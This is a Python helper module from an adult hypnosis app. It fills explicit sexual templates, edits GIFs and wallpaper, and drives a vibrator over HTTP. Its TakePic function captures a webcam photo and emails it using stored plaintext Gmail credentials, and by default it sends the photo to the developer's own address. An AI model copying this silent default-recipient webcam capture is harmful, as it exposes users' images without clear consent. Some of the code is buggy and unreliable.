from win32gui import FindWindow, SetWindowLong
from win32con import WS_EX_LAYERED, WS_EX_TRANSPARENT, GWL_EXSTYLE
from traceback import format_exc
from random import randint, choice
from os import remove, path, makedirs
from PIL import Image
from bs4 import BeautifulSoup
from urllib.request import urlopen	
from ctypes import windll
from time import sleep
from glob import iglob, glob
from smtplib import SMTP, SMTPAuthenticationError	
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from requests import get, exceptions
from cv2 import VideoCapture, imwrite

def TRANS_CLR(): 	return '#f7e9f1'
def TRANS_CLR_ALT():return '#000000' #000000 for black, #777778
def FONT0():		return ("Impact", 44)
def FONT1():		return ("Impact", 28)
def FONT2():		return ("Impact", 20)
def FONT3():		return ("Impact", 15)
def VERSION():		return 'v1.4.5'

def SetWrittenLine(Lines,dom=['None','Male','Female'][2],sub=['Sub','Boy','Girl'][2],FemSex=['Bimbo','Sissy'][0], Writing=False):
	try:
		line=(choice(Lines))
		if line == '': line='i love being a healslut'
		if '99' or '00' in line:
			ReplaceDict = {}
			if dom == 'None': dom = 'Male' if randint(1,2) == 1 else 'Female'
			if   dom == 'Male':
				i = {'m99s':'masters',   'm99':'master',  's99s':'his', 's99':'his','n99':'sir', 'p99s':'cocks',  'p99':'cock'}
			elif dom == 'Female':
				i = {'m99s':'mistresses','m99':'mistress','s99s':'hers','s99':'her','n99':'miss','p99s':'pussies','p99':'pussy'}
			ReplaceDict.update(i)
			if   sub == 'Sub' : i = {'m00':'sub','p00s':'parts','p00':'part'}
			elif sub == 'Boy' : i = {'m00':'boy','p00s':'balls','p00':'dick'}
			elif sub == 'Girl': i = {'m00':'girl','p00s':'tits','p00':'cunt'}
			ReplaceDict.update(i)
			if   FemSex == 'Sissy': 
				i = {'o99':'girlfriend','f99':'sissy','f99s':'sissies','r00':'he', 'f00':'clitty', 'w00': 'man'}
			elif FemSex == 'Bimbo': 
				i = {'o99':'boyfriend', 'f99':'bimbo','f99s':'bimbos', 'r00':'she','f00':'fuckhole','w00':'woman'}
			ReplaceDict.update(i)
			for k,v in ReplaceDict.items():
				line = line.replace(k, v)
		if len(line) > 35 and Writing == True:
			return SetWrittenLine(Lines,dom,sub,FemSex)
		else:
			return line	
	except Exception as e:
		HandleError(format_exc(2), e, 'SetWrittenLine', subj='')

def GenInsultsNPraise():
	with open('Resources\\Text\\Insults.txt','r') as f:
		Insults = f.read().split('\n')
	with open('Resources\\Text\\Praise.txt','r') as f:
		Praise = f.read().split('\n')
	return Insults,Praise
		
def RemoveClickthrough(windowname="Healslut Hypnotherapy"):
	try:
		hwnd = FindWindow(None, windowname)
		windowStyles = WS_EX_LAYERED
		SetWindowLong(hwnd, GWL_EXSTYLE, windowStyles)
	except Exception as e:
		HandleError(format_exc(2), e, 'RemoveClickthrough', subj='')

def HandleError(tb, e, func, subj=''):
	def handlewriter(tb, e, func, subj):
		e=str(e)
		print(func+' Error '+e)
		file = 'Resources\\Errors\\'+func+'.txt'
		with open(file, 'a') as f:
			f.write(tb+'\n'+subj)
	try:
		handlewriter(tb, e, func, subj='')
	except Exception as e:
		handlewriter(tb, e, 'HandleError', subj='')
		
# ##################################
## ##################################
# ##################################		

def StopVibe():
	for url in [URL+'Vibrate?v=0',URL+'RotateAntiClockwise?v=0',URL+'AirAuto?v=0']:
		Thread(target=HP.DoRequest, args=(url,5)).start()
	
def ExtractFrames(mywidth,myheight,Filepath):
	for OGGif in glob(Filepath+'\\*.gif', recursive=True):
		frame = Image.open(OGGif)
		nframes = 0
		namecount = 0.1
		while frame:
			if 'POV' in path.basename(OGGif):
				wx = (mywidth-50)/frame.width
				hx = (myheight-50)/frame.height
				if wx > hx:
					Tup = (int(frame.width*hx),int(frame.height*hx))
				else:
					Tup = (int(frame.width*wx),int(frame.height*wx))
				sizeframe = frame.resize(Tup,Image.ANTIALIAS)
			else:
				sizeframe = frame.resize((mywidth,myheight),Image.ANTIALIAS)
			
			FileDst = OGGif.replace('Resources\Background Gif Original','Resources\Hypno Gif').replace('.gif','')+'\\'
			if not path.exists(FileDst):
				makedirs(FileDst)
			cnt = str(namecount) if len(str(namecount)) == 4 else '0'+str(namecount)
			OutFile = '%s/%s-%s.gif'%(FileDst,path.basename(OGGif).replace('.gif','').replace('/',''), cnt)
			print(OutFile)
			sizeframe.save(OutFile,'GIF',quality=95)
			nframes += 1
			namecount = round(namecount+.1,1)
			try:
				frame.seek(nframes)
			except EOFError:
				break;
					
def ConvertImg(folder, DelOld, screenwidth, screenheight):
	def ResizeImg(img,name,screenwidth,screenheight):
		POS = .9 #percent of screen
		ImgW, ImgH = img.size	
		fract = None
		if ImgW > screenwidth -100:
			fract = (ImgW - 100 - 3000 % screenwidth*POS)/ImgW 
		elif ImgH > screenheight -100:
			fract = (ImgW - 100 - 3000 % screenheight*POS)/ImgH 
		if fract:
			w = int(ImgW*fract)
			h = int(ImgH*fract)
			reimg = img.resize((w,h), Image.ANTIALIAS)
			reimg.save(name+'.png', "PNG")
			print('Resizing...')
			return reimg
		return img
	# ####################### #
	filelist = glob(folder+'*.jpg')+glob(folder+'*.png')
	x=0
	for file in filelist:
		try:
			print(x,'of',len(filelist), file)
			name,sep,tail = file.rpartition('.')
			print(file)
			with Image.open(file) as im:
				im = ResizeImg(im,name,screenwidth,screenheight)
				im.save(name+'.png', "PNG")
			x+=1
		except OSError as e:
			print('\n', e, '\n','error', file, '\n')
	if DelOld == 1:
		print('clearing old .jpgs and resizing images too large for your screen...')
		for file in filelist:
			if '.jpg' in file:
				remove(file)

def HandleOSBackground(Value):
	try:
		if Value == 1:
			windll.user32.SystemParametersInfoW(20, 0,  path.abspath("Resources\\Desktop Backgrounds\\Healslut Background.png") , 0)
		elif Value == 'Exit':
			windll.user32.SystemParametersInfoW(20, 0,  path.abspath("Resources\\Desktop Backgrounds\\Background.png") , 0)
	except Exception as e:
		print('Desktop Background Setup Failed.')
		HandleError(format_exc(2), e, 'HandleOSBackground', subj='')

def GenWordSearchList(Difficulty):
	try:
		if Difficulty=='MEDIUM':	WordCount = 20
		elif Difficulty=='HARD':	WordCount = 28
		else:						WordCount = 12
		Filepath = path.abspath('Resources/Text/Healslut Adjectives.txt')
		with open(Filepath,'r') as f:
			alines = f.readlines()
		Filepath = path.abspath('Resources/Text/Healslut Subjects.txt')
		with open(Filepath,'r') as f:
			blines = f.readlines()
		WordList = []
		for i in range(0,WordCount):
			while True:
				word = choice(alines+blines).replace('\n','').replace('-','').replace(' ','').upper()
				if not word == '' and not word in WordList and not len(word) > 9:
					WordList.append(word)
					break
		return WordList
	except Exception as e:
		HandleError(format_exc(2), e, 'GenWordSearchList', subj='')

def SetupEmail(userinfo):
	try:
		usermail = str(userinfo[0]).replace('\n','')
		userpass = str(userinfo[1]).replace('\n','')
		usersecure = str(userinfo[2]).replace('\n','')
	except IndexError:
		usermail = 'myemail@gmail.com'
		userpass = 'mypassword'
		usersecure = '0'
	try:
		ToEmail = str(userinfo[3]).replace('\n','')
	except IndexError:
		ToEmail = 'ugraveknight@gmail.com'	
	return usermail,userpass,usersecure,ToEmail

def TakePic(usermail, userpass, ToEmail):
	def send_email(usermail, userpass, ToEmail):
		print('sending email')
		try:
			Filepath = path.abspath('Resources\Healslut.jpg')
			img_data = open(Filepath, 'rb').read()
			msg = MIMEMultipart()
			msg['Subject'] = 'Pics'
			msg['From'] = usermail
			msg['To'] = ToEmail

			text = MIMEText("test")
			msg.attach(text)
			image = MIMEImage(img_data, name=path.basename(Filepath))
			msg.attach(image)

			s = SMTP('smtp.gmail.com', 587)
			s.ehlo()
			s.starttls()
			s.ehlo()
			s.login(usermail, userpass)
			s.sendmail(msg['From'], msg['To'], msg.as_string())
			s.quit()
			print('email sent')
		except SMTPAuthenticationError:	
			print('invalid username and pass')
		except Exception as e:
			thandleError(format_exc(2), e, 'send_email', subj='')
	# ####################################### #
	try:
		cam = VideoCapture(0)
		s, img = cam.read()
		if s:
			imwrite("Resources\Healslut.jpg",img)
			send_email(usermail, userpass, ToEmail)
			remove("Resources\Healslut.jpg")
		else:
			print('No Camera Found')
	except Exception as e:
		HandleError(format_exc(2), e, 'TakePic', subj='')
	
def DoRequest(url,delay=0):
	sleep(delay)
	try:
		r = get(url)
	except exceptions.ConnectionError:
		pass
	except Exception as e:
		HandleError(format_exc(2), e, 'DoRequest', subj='')
# ########################################## #
def CenterWindow(root, width, height):
	x = root.winfo_screenwidth() - width
	y = (root.winfo_screenheight() / 2) - (height / 2)
	return (width, height, x, y)
def GenFolders(foundimage=False):
	hyp_folders = glob('Resources\\Images/*/', recursive=True)
	if len(hyp_folders) == 0: 
		hyp_folders.append('No .png files found')
	else:
		hyp_folders.append('All')
	return hyp_folders
def GenUserInfo():
	try:
		Filepath = path.abspath('Resources\\Cam Info.txt')
		with open(Filepath, 'r') as f:
			return f.readlines()
	except FileNotFoundError:
		return ['myemail@gmail.com','mypassword','0']
def GenBackgroundList(BGPath='Resources\\Background Gif Original'):
	bglist = []
	Filepath = path.abspath(BGPath)
	for item in glob(Filepath+'/*.gif', recursive=True):
		NewPath = item.split('Resources\\Background Gif Original\\')[-1]
		bglist.append(NewPath)
	return bglist

PREFDICT_PRESET = \
	{
	'hyp_delay':'500',
	'hyp_game':'None',
	'hyp_opacity':'3',
	'hyp_homework':'Banner',
	'hyp_words':'High',
	'loopingAudio':'None',
	'AudioType':'Either',
	'hyp_able':0,
	'hyp_pinup':1,
	's_playing':1,
	'Freeplay':0,
	'hyp_banword':1,
	'hyp_tranbanr':1,
	'display_rules':0,
	'delold':1,
	's_decay':'10',
	's_decay_pow':'-3',
	'hyp_dom':'Female',
	'hyp_sub':'Girl',
	'FemSex':'None',
	'fontsize':'20',
	'hyp_gfile_var':0,
	'background_select_var':0,
	's_rulename':'Overwatch Helpful',
	'sub':'Mercy',
	'dom':'Roadhog',
	'UseHSBackground':0
	}	

def GenUserPref(PrefFilePath='Resources\\Preferences.txt'):
	try:
		with open(PrefFilePath, 'r') as f:
			lines = f.read().split('\n')
		prefdict = {}
		for line in lines:
			key, sep, value = line.partition(':')
			prefdict[key] = value
	except FileNotFoundError:
		prefdict = PREFDICT_PRESET
	return prefdict
	
def VersionCheck():
	print('if you believe this program has frozen, press ctrl + c, then check the Errors folder for details')
	print('Version number:',VERSION())
	try:
		url = 'https://github.com/ugraveknight/Healslut-Master/releases.atom'
		source = urlopen(url).read()
		soup = BeautifulSoup(source,'lxml')
		entry = soup.feed.entry
		newest_release_url = entry.link.get('href')
		NewestRelease = 'v' + newest_release_url.split('/')[-1]
		if not NewestRelease == VERSION():
			print('A new version is available! Visit:', newest_release_url)
		else:
			print('Your version is up to date')
	except Exception as e:
		print('Error connecting to Github, automatic verison check failed.')



if __name__ == '__main__':
	with open('Resources\\Text\\Feminization.txt', 'r') as f:
		HypnoLines = f.read().split('\n')
	with open('Resources\\Text\\Humiliation.txt', 'r') as f:
		Humiliation = f.read().split('\n')
	line = SetWrittenLine(HypnoLines+Humiliation)
